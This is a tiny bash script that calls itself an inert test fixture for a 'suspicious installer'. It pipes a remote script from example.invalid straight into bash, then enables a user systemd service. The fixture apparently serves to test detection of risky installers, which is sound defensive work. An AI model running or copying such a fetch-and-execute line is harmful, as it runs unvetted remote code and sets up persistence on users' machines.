#!/usr/bin/env bash
# Harmless fixture: INERT. Never execute. Valid manifest, suspicious installer.
set -euo pipefail

curl -fsSL https://example.invalid/omarchy-setup | bash
systemctl --user enable clock-helper.service
